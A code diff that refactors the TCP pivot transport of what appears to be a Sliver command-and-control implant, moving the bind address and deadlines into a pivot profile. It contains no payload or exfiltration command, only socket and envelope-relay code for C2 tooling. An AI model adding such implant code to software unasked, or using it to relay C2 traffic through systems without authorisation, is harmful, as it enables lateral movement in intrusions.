@@ -95,12 +95,12 @@ CLEANUP:
 	return Result;
 }
 
-PSLIVER_TCP_CLIENT TcpInit()
+PSLIVER_TCP_CLIENT TcpInit
+(
+	_In_ PPIVOT_PROFILE pProfile
+)
 {
 	PSLIVER_TCP_CLIENT pResult = NULL;
-	CHAR szBindAddress[] = "127.0.0.1:9898";
-	DWORD dwReadDeadline = 10;
-	DWORD dwWriteDeadline = 10;
 	WSADATA WsaData;
 	int ErrorCode = 0;
 	BOOL Result = FALSE;
@@ -109,9 +109,7 @@ PSLIVER_TCP_CLIENT TcpInit()
 
 	SecureZeroMemory(&WsaData, sizeof(WsaData));
 	pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
-	pResult->lpBindAddress = DuplicateStrA(szBindAddress, 0);
-	pResult->dwReadDeadline = dwReadDeadline * 1000;
-	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
+	pResult->pProfile = pProfile;
 	pResult->Sock = INVALID_SOCKET;
 	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
 		LOG_ERROR("WSAStartup", WSAGetLastError());
@@ -163,7 +161,6 @@ BOOL TcpCleanup
 )
 {
 	if (pSliverTcpClient != NULL) {
-		FREE(pSliverTcpClient->lpBindAddress);
 		if (pSliverTcpClient->pReadLock != NULL) {
 			DeleteCriticalSection(pSliverTcpClient->pReadLock);
 			FREE(pSliverTcpClient->pReadLock);
@@ -214,6 +211,7 @@ BOOL TcpStart
 	USHORT uPort = 0;
 	BOOL UseIpv4 = TRUE;
 	DWORD dwReturnedCode = NO_ERROR;
+	PPIVOT_PROFILE pProfile = NULL;
 
 	SecureZeroMemory(PivotServerKeyExchange, sizeof(PivotServerKeyExchange));
 	SecureZeroMemory(ServerKeyExResp, sizeof(ServerKeyExResp));
@@ -221,7 +219,8 @@ BOOL TcpStart
 	SecureZeroMemory(&In6Addr, sizeof(In6Addr));
 	SecureZeroMemory(&SockAddr, sizeof(SockAddr));
 	SecureZeroMemory(&SockAddr6, sizeof(SockAddr6));
-	Status = RtlIpv6StringToAddressExA(pSliverTcpClient->lpBindAddress, &In6Addr, &uScopeId, &uPort);
+	pProfile = pSliverTcpClient->pProfile;
+	Status = RtlIpv6StringToAddressExA(pProfile->lpBindAddress, &In6Addr, &uScopeId, &uPort);
 	if (Status == STATUS_SUCCESS) {
 		memcpy(&SockAddr6.sin6_addr, &In6Addr, sizeof(In6Addr));
 		SockAddr6.sin6_port = uPort;
@@ -230,7 +229,7 @@ BOOL TcpStart
 		UseIpv4 = FALSE;
 	}
 	else {
-		Status = RtlIpv4StringToAddressExA(pSliverTcpClient->lpBindAddress, TRUE, &InAddr, &uPort);
+		Status = RtlIpv4StringToAddressExA(pProfile->lpBindAddress, TRUE, &InAddr, &uPort);
 		if (Status == STATUS_SUCCESS) {
 			SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
 			SockAddr.sin_port = uPort;
@@ -435,8 +434,8 @@ BOOL TcpSend
 
 	if (pEnvelope->pData != NULL) {
 		PrintFormatA("Write Envelope:\n");
-		if (pEnvelope->pData->cbBuffer > 0x1000) {
-			HexDump(pEnvelope->pData->pBuffer, 0x1000);
+		if (pEnvelope->pData->cbBuffer > 0x800) {
+			HexDump(pEnvelope->pData->pBuffer, 0x800);
 		}
 		else {
 			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
@@ -462,8 +461,6 @@ BOOL TcpSend
 		FinalEnvelope.pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
 		pPeerPlainText = MarshalEnvelope(&FinalEnvelope);
 		FreeBuffer(FinalEnvelope.pData);
-
-
 	}
 	else {
 		pPeerPlainText = pPlainText;
@@ -512,15 +509,7 @@ PPIVOT_CONNECTION TcpAccept
 	}
 	
 	pResult = ALLOC(sizeof(PIVOT_CONNECTION));
-	/*pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
-	pResult->lpHost = DuplicateStrA(szHost, 0);
-	pResult->dwReadDeadline = dwReadDeadline * 1000;
-	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
-	pResult->Sock = INVALID_SOCKET;
-	pResult->dwPort = dwPort;*/
 	pTcpClient = ALLOC(sizeof(SLIVER_TCP_CLIENT));
-	pTcpClient->dwReadDeadline = 10 * 1000;
-	pTcpClient->dwWriteDeadline = 10 * 1000;
 	pTcpClient->Sock = NewSock;
 	pTcpClient->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
 	pTcpClient->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
